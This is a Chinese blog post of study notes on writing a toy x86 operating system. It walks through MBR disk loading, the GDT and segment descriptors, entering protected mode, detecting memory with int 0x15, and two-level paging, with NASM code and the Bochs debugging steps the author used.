dx, 0x1f7 ;command    mov al, 0x20 ;读指令    out dx, al;检测硬盘状态.not_ready:    nop ;等待一下，相当于sleep()    in al, dx ;切换为读状态，dx变为status寄存器，读入状态数据    and al, 0x88 ;取硬盘控制器是否准备好和是否繁忙的两位    cmp al, 0x08    jnz .not_ready ;两位有一位不和要求就跳回重新判断;从0x1f0端口读数据    mov ax, di ;之后mul命令会将ax作为乘数，用来计算读取数据的次数，这里保存的是待读扇区数    mov dx, 256 ;一次读2字节，一个扇区512字节，每个扇区读256次    mul dx ;1*256=256，这个数据就是读取次数，会被保存到ax中    mov cx, ax ;将读取次数存入计数寄存器cx;开读!    mov dx, 0x1f0.go_on_read:    in ax, dx     mov [bx], ax ;将读入的字存到写入地址0x900中    add bx, 2 ;一次读两字节，写入地址加2    loop .go_on_read ;循环，每次cx减1，直到等于0    rettimes 510-($-$$) db 0db 0x55, 0xaa\n\nnasm -o mbr1.bin mbr1.Sdd if=./mbr1.bin of=./hd60M.img bs=512 count=1  conv=notrunc\n\n这段测试代码的目的就是读取从地址2开始的内容，然后写到0x900处，最后跳转到0x900处。但是我们并没有loader内容……让我们再编一个二进制文件，给他放上点东西\n%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRmov byte [gs:0x00], &#x27;2&#x27; mov byte [gs:0x01], 0xa4mov byte [gs:0x02], &#x27; &#x27;mov byte [gs:0x03], 0xa4mov byte [gs:0x04], &#x27;L&#x27;mov byte [gs:0x05], 0xa4mov byte [gs:0x06], &#x27;O&#x27;mov byte [gs:0x07], 0xa4mov byte [gs:0x08], &#x27;A&#x27;mov byte [gs:0x09], 0xa4mov byte [gs:0x0a], &#x27;D&#x27;mov byte [gs:0x0b], 0xa4    mov byte [gs:0x0c], &#x27;E&#x27;mov byte [gs:0x0d], 0xa4mov byte [gs:0x0e], &#x27;R&#x27;mov byte [gs:0x0f], 0xa4 ;每个打印的字符占2个字节大小，低字节是字符ascii码，高字节是颜色和显示模式。0xa4代表绿色背景闪烁，前景色为红色(RGB)jmp $\n\n这就是loader.S，编译成loader.bin后我们把它放到第二扇区上去\nnasm -o loader.bin loader.Sdd if=./loader.bin of=./hd60M.img bs=512 count=1 seek=2 conv=notrunc\n\n写入虚拟硬盘中的时候seek&#x3D;2，意思就是跳过两个块，在第二扇区\n启动bochs，如果一切顺利，mbr将把第二扇区上的数据读取到0x900地址上并跳转到那里，往显存上写入2 loader这几个字符并出现在窗口上\n\n真好。绿底的2 loader不断闪动，就像20世纪的单机游戏通关彩蛋一样。\n保护模式之前我们都是在实模式上学习和实践的，对标的就是8086处理器，16位，段寄存器+偏移寄存器寻址，但是实模式没有权限的概念，操作系统能到的内存用户也能到，安全性比较差，而且一次性只能运行一个程序，最大内存也只有1mb，所以之后出现了平坦模式，用一个32位寄存器就能寻址所有的地址，还有保护模式，寄存器增宽，使用段描述符寻址。但是由于兼容的原因，所以会出现16bit和32bit操作的相互转换，就是反转前缀，0x66和0x67，这里不多说。\n段描述符为了区别各个内存片段之间的特征和权限，比如代码段就可读可执行不可写，数据段就可读可写不可执行，我们需要给各个内存段一点空间描述它的级别、大小之类的约束属性。，这就是段描述符\n\n这样的一个段描述符一共8字节，这本书提到的各类描述符都是8字节。\n首先能注意到段基址和段界限，保护模式下地址总线宽度32位，所以必须要32位来描述这个段的位置，就是段基址，但是你会发现这32位段基址居然还不在一起，历史遗留问题。\n段界限就是这个段最大有多大，假如在这个段中访问的位置超过了段基址+段界限，那么就会触发异常。同时对于数据段和代码段，数据往高的内存地址增长，对于栈，数据往低的内存地址增长，相对应的段界限计算也不同。你可能还会注意到，段界限也是分散的。实际上还有一个G位和段界限有关系，如果G位是0，那么段边界就是段基址+段界限，如果是1，就是段基址+段界限*4kb\n对于高32位来说，首先S为0代表该段为系统段，为1就是数据段。根据S代表不同的系统与数据段，占4位的type会代表的段类型也会不同，详细如下\n\n书中主要说明了非系统段的type作用，RC位代表的读写执行是不是有种熟悉的感觉……\nX代表代码段或数据段，代码段不可写，数据段不可执行。A由cpu设置，代表有没有被cpu访问过，如果有就置1。C代表一致性代码段，，，\n\n一致性代码段是指如果自己是转移的目标段，并且自己是一致性代码段，自己的特权级一定要高于当前特权级，转移后的特权级不与自己的 DPL 为主，而是与转移前的低特权级一致，也就是听从、依从转移前的低特权级。C 为 1 时则表示该段是一致性代码段，C 为 0 时则表示该段为非一致性代码段。\n\n好抽象……\nE代表向下或者向上拓展，对应之前说的代码段、数据段和栈段。\n段描述符的13-14位是DPL段，Descriptor Privilege Level，描述特权等级，分为0、1、2、3，数字越小特权越大，用户程序处于3，操作系统处于0。\nP段表示present，是否存在，如果检查到为0CPU就会抛出异常。有种绕过失败的既视感……\nAVL字段用来……搞笑的，没有专门用途。\nL字段表示是否为64位代码段，我们在32位cpu下编程，一般置0.\nD&#x2F;B，对于代码段此为D位，D为0，指令的有效地址和操作数就是16位，D为1就是32位；对于栈段，此为B位。B为0，使用sp寄存器，就是16位，B为1，使用esp，32位。\nG字段，用来指定段界限的单位，1字节或者4kb，前文已述。\n对于系统段中的描述符，之后讲到中断再展开。\n描述符表及选择子段描述符放在哪里？全局描述符表。\n\n全局描述符表（GDT）就是一个大数组，它存在于内存中，位置由一个48位的大寄存器GDTR保存。GDTR的前16位像段描述符一样表示全局描述符表的界限，只不过单位就是字节，以此可以计算出全局描述符表最多可容纳2^16&#x2F;8&#x3D;8192个描述符；16-47位表示他在内存中的地址，32位对应总线长度。需要时通过lgdt指令和内存中的gdt_ptr初始化并加载gdt\n那么GDTR通过什么连接全局描述符表呢呢？选择子。\n\n选择子用来确认段描述符，每个选择子16位，位于内存中。它的作用相当于段基址寄存器：偏移地址寄存器中的段寄存器（其实作用还要多一点），也有一点区别，他存放的不是段基址，而是索引值。索引值就是该段在GDT或者LDT（局部描述符表）描述符数组中的下标，2^12&#x3D;8192，与最多存放的描述符数量对应。TI用来指示实在GDT还是LDT中。RPL前文提到过，表示0、1、2、3四个特权级。\n但是每次访问段描述符都很耗费时间，所以当段基址，不对，此处应当说段描述符没有改变时就用一个段描述符缓冲寄存器存储段描述符，每次访问相同的段时就直接读取该段对应的段描述符缓冲寄存器。虽然段描述符缓冲寄存器是保护模式下的产物，但它也可以用在实模式下，为什么要提及这一点呢？之后在实现保护模式的时候涉及流水线刷新的时候我们再详谈\n原文举出的例子很生动\n\n例如选择子是 0x8，将其加载到 ds 寄存器后，访问 ds：0x9 这样的内存，其过程是：0x8 的低 2 位是RPL，其值为 00。第 2 是 TI，其值 0，表示是在 GDT 中索引段描述符。用 0x8 的高 13 位 0x1 在 GDT 中索引，也就是 GDT 中的第 1 个段描述符（GDT 中第 0 个段描述符不可用）。假设第 1 个段描述符中的 3个段基址部分，其值为 0x1234。CPU 将 0x1234 作为段基址，与段内偏移地址 0x9 相加，0x1234+0x9&#x3D;0x123d。用所得的和 0x123d 作为访存地址。\n\n之所以GDT0不可用，是因为需要通过选择子是否为0来判断他有没有初始化。\nLDT点到为止，说是没用过。\n步入保护模式首先为了兼容实模式，默认还是打开了20位的地址回绕。我们需要把20位的物理地址限制打开\nin al, 0x92 or al,  00000010bout 0x92, al\n\n其次，我们需要设置控制寄存器（CRx）。控制寄存器可以展示cpu的内部状态，我们也可以通过它来控制cpu的运行机制。把CR0的PE（protection enable）位置1，从实模式切换为保护模式\nmov eax, cr0or eax, 0x00000001mov cr0, eax\n\n复习一下我们的执行流程，BIOS检查并处理完各个硬件后步入mbr，我们编写的mbr从硬盘中读取加载一部分内存后再跳转到对应的代码段执行。我们需要做的就是将保护模式相关的代码更新进被加载的硬盘内容中，再更改mbr读入的扇区数，因为loader.bin变长了；并且还要更新boot.inc里的一些配置信息\n全局描述符表设置 &amp; 描述符实现;boot.incLOADER_BASE_ADDR equ 0x900 LOADER_START_SECTOR equ 0x2;gdt描述符属性DESC_G_4K equ 1_00000000000000000000000b ;段界限单位设为4kb，b代表字节DESC_D_32 equ 1_0000000000000000000000b ;32位操作方式DESC_L equ 0_0000000000000000000000b ;64位代码段，置零即可DESC_AVL equ 0_0000000000000000000000b ;随便填，置零DESC_LIMIT_CODE2 equ 1111_0000000000000000b ;代码段界限DESC_LIMIT_DATA2 equ DESC_LIMIT_CODE2 ;数据段界限DESC_LIMIT_VIDEO2 equ 0000_0000000000000000b ;打印界限DESC_P equ 1_000000000000000b ;存在标志DESC_DPL_0 equ 00_0000000000000b DESC_DPL_1 equ 01_0000000000000bDESC_DPL_2 equ 10_0000000000000bDESC_DPL_3 equ 11_0000000000000b ;特权等级0、1、2、3DESC_S_CODE equ 1_000000000000b ;非系统段DESC_S_DATA equ DESC_S_CODEDESC_S_sys equ 0_000000000000b ;系统段DESC_TYPE_CODE equ 1000_00000000b ; 可执行不可读，非一致性，已访问位置0DESC_TYPE_DATA equ 0010_00000000b; 不可执行可写，向上扩展，已访问位置0DESC_CODE_HIGH4 equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_CODE2 + DESC_P + DESC_DPL_0 + DESC_S_CODE + DESC_TYPE_CODE + 0x00DESC_DATA_HIGH4 equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_DATA2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00DESC_VIDEO_HIGH4 equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00;--------------选择子属性---------------RPL0 equ 00b RPL1 equ 01b RPL2 equ 10b RPL3 equ 11b TI_GDT equ 000b TI_LDT equ 100b\n\n这么来看我们调到32位需要调的东西有：取消地址回绕、cr0控制寄存器、全局描述符表还有选择子。\n然后就是正菜：加载内容\n%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRLOADER_STAK_TOP equ LOADER_BASE_ADDRjmp loader_start ;GDT描述符GDT_BASE: dd 0x00000000         dd 0x00000000 ;第一个描述符置空，选择子有检查需要导致0下表对应的描述符没用CODE_DESC: dd 0x0000ffff ;界限            dd DESC_CODE_HIGH4DATA_STACK_DESC: dd 0x0000ffff ;界限            dd DESC_DATA_HIGH4VIDEO_DESC: dd 0x80000007;单位4kb，界限为7大小即为0x7fff，显存位置从0xb8000开始            dd DESC_VIDEO_HIGH4GDT_SIZE equ $-GDT_BASEGDT_LIMIT equ GDT_SIZE-1times 60 dq 0 ;预留60个描述符的空位，每个描述符8个字节;选择子对应描述符数组    SELECTOR_CODE equ (0x0001&lt;&lt;3) + TI_GDT + RPL0SELECTOR_DATA equ (0x0002&lt;&lt;3) + TI_GDT + RPL0SELECTOR_VIDEO equ (0x0003&lt;&lt;3) + TI_GDT + RPL0 ;全局描述符表，权限0gdt_ptr dw GDT_LIMIT        dd GDT_BASE ;这就是GDTR寄存器用来加载gdt的地方loadermsg db &#x27;2 loader in real.&#x27;loader_start:        mov sp, LOADER_BASE_ADDR        mov bp, loadermsg ;字符串地址        mov cx, 17 ;长度        mov ax, 0x1301 ;调用号和类型        mov bx, 0x001f ;页号及字体颜色        mov dx, 0x1800        int 0x10 ;---------------进入保护模式-------------------;打开A20，取消地址回绕in al, 0x92or al, 0000_0010Bout 0x92, al;加载 GDTlgdt [gdt_ptr];将 cr0 的 PE位 置1，标志着进入保护模式mov eax, cr0or eax, 0x00000001mov cr0, eaxjmp dword SELECTOR_CODE:p_mode_start ;刷新流水线[bits 32] ;提示汇编器32位模式操作p_mode_start:        mov ax, SELECTOR_DATA        mov ds, ax        mov es, ax        mov ss, ax        mov esp, LOADER_STAK_TOP        mov ax, SELECTOR_VIDEO        mov gs, ax                mov byte [gs:160], &#x27;p&#x27; ;与实模式不同，此时段寄存器gs指向的是显存描述符的选择子        jmp $\n\n注意到最后跳转到p_mode_start正常来说是完全没必要的，但是去掉程序运行就会出错。之前在看csapp的时候接触过流水线，但是由于看得走马观花只入不出，现在几乎忘光了。前后文是一个16位指令格式到32位指令格式的跳转，流水线中提前加载的还是16位译码方式，所以需要通过无条件跳转清空流水线\n另一方面由于段描述符缓冲寄存器的存在，段基址不变缓冲寄存器的内容还是不变，但是它也还是遵循先前16位时20位段基址的实模式存储模式，因此需要把它也换成32位，这同样能通过无条件跳转命令来解决\nnasm -o loader.bin loader.Sdd if=./loader.bin of=./hd60M.img bs=512 count=4 seek=2 conv=notrunc \n\n由于代码变长了，所以我们的mbr加载时读入的硬盘扇区数也要增加，记得count改为4！（不然在loader的第一个跳转命令之后就全都是0000，别问我怎么知道的\n从实际代码我们可以看出来，选择子和初始化GDTR寄存器的gdt_ptr都预先写好在内存中，选择子的下标分别对应全局段描述符表中的code、data和video，同时结合头文件的信息会发现栈地址就是数据段基址，而且这里栈描述符中规定栈是向高地址增长的——很违反直觉，之前我在pwn里接触过的elf可重定位文件都是把栈和数据段代码段分开，而且栈是向低地址增长的，这里一并写作数据段了，是为了图方便。\n但是结合boot.inc来看，书中原文的VEDIO_DSC的基址定在了0x8000处而不是0xb8000处（DESC_LIMIT_VIDEO2和DATA_STACK_DESC，这样真的能把选择子对应的地址定位到显存中吗？\n还有一件事！\n\n就在这里，将mbr.S这个片段中记录待读入扇区的寄存器cx也改为4，再重新编译、写入虚拟磁盘，原因同样是读入的硬盘扇区数增加了，不然的话被加载的程序不全，cpu会执行一些奇奇怪怪的代码\nnasm -o mbr1.bin mbr1.Sdd if=./mbr1.bin of=./hd60M.img bs=512 count=1 conv=notrunc\n\n看看成果：\n\n通过creg命令查看控制寄存器，PE字段的确被设为了1，我们成功进入了保护模式\n\n哪里有问题？但是这样其实是有问题的，你会发现我们步入保护模式后往显存上写的’p’字符并没有展现到屏幕上。现在程序已经进入jmp -2的死循环，左下角也打印出了2 loader in real，可见已经完全将loader加载进了内存并且初始化了GDTR寄存器，现在ctrl+c打断程序，再使用命令info gdt查看肯定就可以全局段描述符到实际的地址：\n\n以上所有步骤我都是照抄书本原文代码，差别只在于我自己重写了注释或者改变了输出，你可以看到下标为3的GDT，对应着我们原本预想的显存段，实际地址是0x8000而不是0xb8000！\n一开始我通读boot.inc的时候就提出了疑问：DESC_VIDEO_HIGH4的最后8位，对应段基地址的16-24位为0，再结合loader1.S中VIDEO段的低16位是0x8000，得到的只有0x8000而不是0xb8000。不知道这的确是书中的错漏还是我忽略了书中的某些内容，但是照抄源码会导致显存段的地址错误，要是想把最后的p打印出来，必须要设置boot.inc中DESC_VIDEO_HIGH4最后一个字节为b\nDESC_VIDEO_HIGH4 equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + \\DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + \\DESC_S_DATA + DESC_TYPE_DATA + 0x0b\n\n重新编译，写入虚拟硬盘再启动，可以看到：\n\n小p被打印出来了，这印证了我的猜想，也证明了我们的确进入了保护模式，段寄存器通过选择子找到全局段描述符表中显存的实际地址并成功写入。\n也不枉我一行一行对着代码确认，这段时间看书还是很用心仔细的（挺胸\n如果当初没发现这个错误，最快的找出错误的方法也是查看段描述符表对应的显存地址是否有误，如果有误再去溯源段描述符表上段基址的设置，最终还是能够找到boot.inc中最后的那个字节，这是后话。\n处理器微架构浅探流水线\n总的来说就是多核处理器帮着把接下来的事情都做了，重叠执行接下来几个命令的执行步骤。csapp中亦有涉及且更加详细，通常完成一个汇编指令抱回取指、译码、访存、执行这四步，流水线通过这种多个指令重叠的方式可以使指令执行效率提高好几倍\n乱序执行当有不涉及上下文的指令时，可以让不相关的指令不按顺序执行；甚至有一定相关度的也可以，我们可以将一个指令拆分成微指令，只要不影响程序执行就可以\nmov eax, [0x1234]push eaxcall function \n\n比如上面三条指令，第一条需要访问内存，寻址需要花费比较多的时间，我们就可以利用这儿时间做其他事；通过接下来两个指令我们可以预知esp的位置，因此我们可以像sub esp, 4然后直接call function，不必等待eax。这样做就可以持续不断地往流水线上放接下来的指令步骤，不会遇到单个指令等待就拉屎夹断的情况\n缓存此事在csapp第六章存储器层次结构中亦有提及，同样是花了一大章专门讲解。只不过大概是我当初学昏过去了，现在竟记不得一点。考虑日后再补\n唉，刚刚找到pdf看了两眼，写得真好\nDRAM相对于直接访问硬盘来说已经快了很多，但对于cpu来说还是马达马达，因此我们需要更快的——静态随机存取存储器，它位于主存与cpu之间，实际上速度和寄存器差不多快\n\n还有一个很重要的缓存策略和适应缓存的程序设计原理，局部性（下图仍然引自csapp，沃日，写的真好。可惜当初的我不懂\n\n唉，实现完这个操作系统之后真想把csapp再读一遍\n分支预测此事依然在csapp中的第四章处理器体系结构中亦有提及，之不过大概是我当初学得睡过去了，现在只留了个印象\n\n上面的流水线操作，指将指令译码后转换为微操作在此处亦有提及。原来，你一直在我身边。\n本书中提及的分支预测有两种方法：第一种二位预测法，通过条件跳转的结果来改变预测是否跳转的权重，从而进行条件跳转的分支预测，这种方法通过BTB分支目标缓冲器实现；第二种，静态预测器，它相当于一个程序，写满了预测策略，由大量统计总结而来，比如跳转位置在当前位置之前，则大概率需要进行跳转\n内存段保护保护二字体现在哪里？\n第一是通过段描述符对内存的保护，除了多出了很多字段来说明段的各种属性，段描述符还有很大一部分空间被设为段界限，每次cpu对数据段检查时，就会查看地址是否超越了段界限，比如写入是否越界。实际上不仅仅是数据段，代码段栈段也一样。前文提到虽然栈是向低地址增长的，但是仍然能够把栈段设为向上拓展，这实际上并没有干涉到push、pop之类命令的具体实现，比如push eax，esp的地址还是乖乖减少四字节，这个增长方向只是为了确认段界限方向，进一步方便检查栈是否越界。\n第二是对于寄存器的保护，保护模式下段寄存器（就是存储选择子的寄存器）一共包括CS、DS、ES、FS、GS、SS，通常cs:ip用来设置当前要读取的指令的位置，SS主要作为栈段寄存器，相对应的，他们存储的段描述符中type字段也有对应的检查，CS必须位于代码段并且可执行，SS只能位于数据段并且必须可读写；对于其他四个寄存器而言，他们在代码段必须可读可执行，如果在数据段，只读或者可读写都可以。\nThen how about…… kernel?章节介绍说本章以接触各类硬件为主，pretty cool\n你想知道……内存吗？之后我们会接触到虚拟内存、内存管理之类。第一个问题就是……如何搞定内存？先从查看物理内存开始\n中断0x15获取内存如前所述，中断0x10主要和显示相关，内存获取则可以通过中断0x15的三个子功能决定。和之前相同，他们的功能号需要放在寄存器eax中。\n虽然说进入了保护模式就没办法BIOS中断了，但我们还是做做样子。\nEAX&#x3D;0xE8200xE820是最灵活的中断内存获取方式，不仅能获取内存容量，还能获取内存布局。它返回的数据是一种叫做地址范围描述符的结构：\n\n\n调用中断就需要传入参数：\n\n\nEAX&#x3D;0xE801这种方法只能获取内存大小，最大只能识别4GB的内存的同时，内存大小的表达方式也……颇具特色\n\n比较鬼畜的是返回的内存容量通过四个寄存器存储，而且两两一样……\n计算方法是：\nAX*1024+BX*64*1024+1MB\n\n而且实际计算出的内存大小要+1mb才等于实际的内存大小\nAX&#x3D;0x88这种方式最简陋，只能识别最大64MB的内存大小，大于64就只显示63\n\n代码 &amp;&amp; 实践mbr.S和之前引导加载硬盘的部分一样，这里就补上loader.S\n%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRLOADER_STAK_TOP equ LOADER_BASE_ADDRjmp loader_start ;GDT描述符GDT_BASE: dd 0x00000000        dd 0x00000000 ;第一个描述符置空，选择子有检查需要导致0下表对应的描述符没用CODE_DESC: dd 0x0000ffff ;界限        dd DESC_CODE_HIGH4DATA_STACK_DESC: dd 0x0000ffff ;界限        dd DESC_DATA_HIGH4VIDEO_DESC: dd 0x80000007;单位4kb，界限为7大小即为0x7fff，显存位置从0xb8000开始        dd DESC_VIDEO_HIGH4GDT_SIZE equ $ - GDT_BASEGDT_LIMIT equ GDT_SIZE-1times 60 dq 0 ;预留60个描述符的空位，每个描述符8个字节total_men_bytes dd 0 ;在内存中地址为0xb00，用来存储内存容量，之后在内核中会用到gdt_ptr dw GDT_LIMIT         dd GDT_BASE ;这就是GDTR寄存器用来加载gdt的地方，界限和起始地址ards_buf times 244 db 0 ;人工对齐，从描述符结束至此共256字节，记录ards结构体ards_nr dw 0;记录ards结构体数量loader_start:    xor ebx, ebx ;ebx第一次调用置零    mov edx, 0x534d4150 ;校验&#x27;SMAP&#x27;    mov di,  ards_buf ;返回的结构体通过es:di返回值ards_buf处    .e820_mem_get_loop:        mov eax, 0x0000e820  ;子功能号        mov ecx, 20 ;结构体大小为20字节        int 0x15        add di, cx ;每次调用后将返回结构体写入地址增加20字节        inc word [ards_nr] ;记录数量        cmp ebx, 0 ;确认是否全部返回完毕        jne .e820_mem_get_loop    jmp $\n\n之后编译为.bin文件，写入模拟硬盘\ndd if=check_memory/mbr.bin of=hd60M.img bs=512 count=1 conv=notruncdd if=check_memory/loader.bin of=hd60M.img bs=512 count=4 seek=2 conv=notrunc\n\n\n成功读入ards\n内存分页一级页表为什么要用页表？\n在我们潜意识中，程序中的线性地址应该在物理地址中也是线性的——比如有一个程序需要占用0x2000000的内存，实际的物理地址中也需要腾出0x2000000的连续空闲内存来用作该程序的内存，这样不是太麻烦了吗？\n现实情境下空闲内存常常是大小错落的，像东南亚上支离破碎的群岛，很难找到一块很大的面积而且又刚好空闲，此时如果有程序有这么大的内存空间占用要求，那么要么等已经用完的内存一个个抽出来直到拼凑出一整块足够大的内存，要么就将现有的内存使用频率较低的返回硬盘，再临时抽给新的需要占用空间的程序使用\n如果一个程序需要占用的内存可以分散开来，不必在物理地址中保持线性，那么空间就可以得到充分的利用，需要较大内存时开销也不那么大。有一个想法，我们能否像哈希表那样，用程序地址-&gt;实际地址的方式通过一个数据结构保存这种一一对应关系，在需要寻址的时候再一个一个对应呢？\n这大概就是页表的雏形。但是如果真的逐字节一个一个对应，在拥有4G内存的情况下需要花费的存储大概是4GB*32位地址表示&#x3D;16GB，完全得不偿失。但是我们可以将单位地址块增大，单位地址块、所需页表项、总内存有这样的代数关系：\n\n单位地址块*所需页表项&#x3D;总内存\n\n换句话说，单位地址块越大，所需页表项越小。但是这是由CPU规定的，一页大小4KB，2^32&#x2F;(4*2^10)&#x3D;2^20计算可得我们在32位架构下需要2^20个下标，每个下标又需要32位来表示对应的物理地址，也就是4字节，一共4MB来存储页表。\n这样子我们同样可以推出：索引页表下标的方式就是取高20位的地址，对应到相应页表项之后从页表项取出对应的物理地址块的起始点，再将物理地址块加上低12位就可以得到实际的物理地址\n\n这你就要问了，那我怎么知道页表地址在哪里呢？\n还记得设置段描述符基址的lgdt命令和gdt_ptr吗？我们需要一个地方在初始化页表的时候保存页表的基址方便索引，只不过这不放在内存中，而是控制寄存器cr3。记得我们之前设置cr0标志进入保护模式吗？cr3和cr0一样，也是控制寄存器。\n二级页表以上说的其实是一级页表，现代操作系统普遍使用二级页表。\n每个进程都需要一个自己的页表来索引实际物理地址，这样进程一多，光页表占用的空间就很可观了；同时操作系统需要固定占用内存中的高1GB，剩下的留给用户，所有页表项必须提前建好（前后逻辑我也不明白），我们需要动态创建页表项。\n如果32位地址空间全部用单一页表表示，一个页表占用的空间高达4MB，每一个进程都要花费4MB空间来记录页表，这会造成极大的空间浪费，同时很多地址根本不会被访问到，解决方案就是像利用页表把内存空间打散一样——把页表打散，用所谓的“页目录表”管理页表，二级页表应运而生。\n读到这里我自然有一个疑问，不同进程之间不能共用一个页表吗？就像动态链接那样，共享一个内存空间。想象动态链接的区别，库代码一般是只读的，而多个进程之间如果共用一个页表的话可能会导致这个进程访问到另一个进程的地址，这会导致权限和安全问题。\n与一级页表相同，二级页表的每个页目录项对应的页表块都是4kb，页目录表占用的内存空间也一共为4kb，包含1024个页表，4kb*4kb*1024&#x3D;4GB，刚好能表示32位架构中的所有地址。\n前文所述，一级页表的每一个页表项用4字节记录，二级页表的每一个页目录项也一样，然而无论是页表块还是每个页表项对应的内存块都是4kb，实际上完整地存储地址的话32位里面低12位都是0，这自然不会浪费，会被用作记录页表&#x2F;内存块的各种属性\n\n和之前的段描述符很相似，也有不少位代表的作用有重合。\nP，存在位，表示是否存在于物理地址位中，如果为0仍然被访问了则会抛出pagefault异常\nRW，1代表可读可写，0代表可读不可写\nUS，user&#x2F;supervisor，1表示user级，什么程序都能寻址看到这一段内存，0表示supervisor，需要特权级别0、1、2的程序才能访问\nPWT，1表示这一块内存非比寻常，是高速缓存\nPCD，1表示该页启用高速缓存\nA,1表示该页已经被cpu访问过了，该位会被cpu定时清零，记录1的次数可以反映出使用频率，从而在内存空间不够时挑选出使用频率低的内存块暂时返回硬盘中，抽出给迫切需要的内存用\nD表示脏页，1表示这个内存页已经被写过了\nPAT，在页面级上设置内存属性，比较复杂，置零即可\nG，global，内存会把很常用的内存块放入高速缓存TLB，如果该位为1直接去TLB里找该内存块即可，不用浪费时间寻址\navl，可用位。cpu并不会理会该位的值？\n以上就是页表项具体的存储内容，那么一个虚拟地址是具体如何被寻址的呢？\n一个32位的虚拟地址会被拆分成10+10+12\n\n高10位用来索引页目录表中的页表，中10位用来索引页表中对应的物理地址块，得到的物理地址块加上最后的12位偏移得到的就是实际地址。\n启动分页机制，我们需要做三件事：\n\n\n准备好页表和页目录表\n将页表地址放入cr3\n将cr0的PG位置1\n\n\n说到cr0的PG位，上次我们通过设置PE位标志进入保护模式，回顾一下cr0的字段：\n\nPG位标志着paging，大概以为通过页表进行虚拟地址寻址。\n同样的，页表基址被放入cr3，单个页表块为4kb，地址对齐的情况下cr3可以留出12位的空间不必用作保存页表基址，当然要物尽其用\n\nPWT位和PCD位在之前的页表项已经介绍过了，用于设置高速缓存相关。其他位都没用。\n代码&amp;&amp;实践首先，我们要做的第一步：初始化页目录表和页表\n; loader.S;之前就是进入保护模式的内容call setup_pagesgdt [gdt_ptr] ;页表中会将gdt放在内核的地址空间，也就是3GB以上的地址，先将gdt起始地址和偏移量信息保存到gdt_ptr处mov ebx, [gdt_ptr+2] ;取得gdt基址or dword [ebx + 0x18 + 4], 0xc0000000 ;将gdt描述符中视频段（第三个描述符，高4字节）的段基址+0xc0000000add dword [gdt_ptr + 2], 0xc0000000 ;将gdt基址设为内核所在的高地址add esp, 0xc0000000 ;栈指针同样映射到内核地址mov eax, PAGE_DIR_TABLE_POSmov cr3, eax;打开cr0的pg位mov eax, cr0or eax, 0x80000000mov cr0, eax;开启分页后重新加载gdt基址lgdt [gdt_ptr]mov byte [gs:160], &#x27;V&#x27;jmp $setup_page:; 将页目录表空间清零    mov ecx, 4096 ;空间大小4kb，设置循环次数    mov esi, 0.clear_page_dir:    mov byte [PAGE_DIR_TABLE_POS + esi], 0    inc esi    loop .clear_page_dir;创建页目录表项.create_pde:    mov eax, PAGE_DIR_TABLE_POS    add eax, 0x1000 ;第一个页表位置，紧挨着页目录表    mov ebx, eax ;为.create_pte做准备    or eax, PG_US_U | PG_RW_W | PG_P ;设置用户级别，写权限;将页目录项0和0xc00都设为第一个页表地址，为将地址映射为内核地址做准备        mov [PAGE_DIR_TABLE_POS + 0x0], eax    mov [PAGE_DIR_TABLE_POS + 0xc00], eax; 0xc0000000以上的目录项用于内核空间    sub eax, 0x1000    mov [PAGE_DIR_TABLE_POS + 4092], eax ;最后一个目录项即为页目录表的位置    ;开始建立第一个页表    mov ecx, 256 ;范围0-256个页表项，一共1M的内存范围    mov esi, 0    mov edx, PG_US_U | PG_RW_W | PG_P.create_pte:    mov [ebx+esi*4], edx ;此时ebx为页表起始地址    add edx, 4096     inc esi    loop .create_pte;建立第二个页表    mov eax, PAGE_DIR_TABLE_POS    add eax, 0x2000 ;第二个页表    or eax, PG_US_U | PG_RW_W | PG_P    mov ebx, PAGE_DIR_TABLE_POS    mov ecx, 254 ;范围为目录项769-1022    mov esi, 769.create_kernel_pde:    mov [ebx+esi*4], eax    inc esi    add eax, 0x1000    loop .create_kernel_pde    ret\n\n; boot.incPAGE_DIR_TABLE_POS equ 0x100000 ;页目录起始地址1mbPG_P equ 1bPG_RW_R equ 00bPG_RW_W equ 10bPG_US_S equ 0000bPG_US_U equ 100b\n\n值得注意的是，一开始我们将页目录表项中的第0项和第0xc00项都指向的页表的第0项，为什么要这样设置呢？原因是我们要保证分页前的线性地址与分页后的虚拟地址对应的物理地址一直，我们在加载内核之前程序中运行的loader地址范围都在1mb范围之内，我们也预备将来巴操作系统内核放在低端1mb的物理地址空间内，但是操作系统的虚拟地址是0xc0000000以上，所以我们需要将第0xc00表项指向页表的第0项\n我们需要用到的也就只有1mb空间，一个页表可以涵盖4kb*1024&#x3D;4mb的内存，我们只要用到1&#x2F;4的表项，就是256个表项即可\n至于建立第二个页表的部分——为什么要逐一设置目录项769-1022?之前说过，虚拟4GB内存空间中高1GB都必须指向内核所在的物理地址空间，内核空间作为陷入内核给用户调用的部分可以给所有进程调用，因此是给所有用户进程共享的。我们要在一开始将所有的对应页目录表项与页表地址对应，这样才能确保内核空间新增页表时不必将新的内核页表同步到所有进程中。\n为什么操作系统的虚拟地址在0xc0000000上？\n32位虚拟地址空间一共4GB，用户空间占用了低位的3GB，内核空间占用的3GB以上，对应的0xc0000000-0xffffffff就是第四个1GB内存，对应的就是内核地址起始位置。我们从线性地址转变为分页模式，引入虚拟地址相应的对内核空间内容的寻址也将变为0xc0000000为基址，所以我们需要将页目录表寻址中0xc00下标对应的页表索引设置为0，也就是实际上我们还是不动之前的那些全局描述符表的实际位置，只是寻址目的地产生了改变，我们顺应将页目录表对应的表项改变而已\ndd if=paging/mbr of=./hd60M.img bs=512 count=1 conv=notruncdd if=paging/loader of=./hd60M.img  bs=512 count=4 seek=2 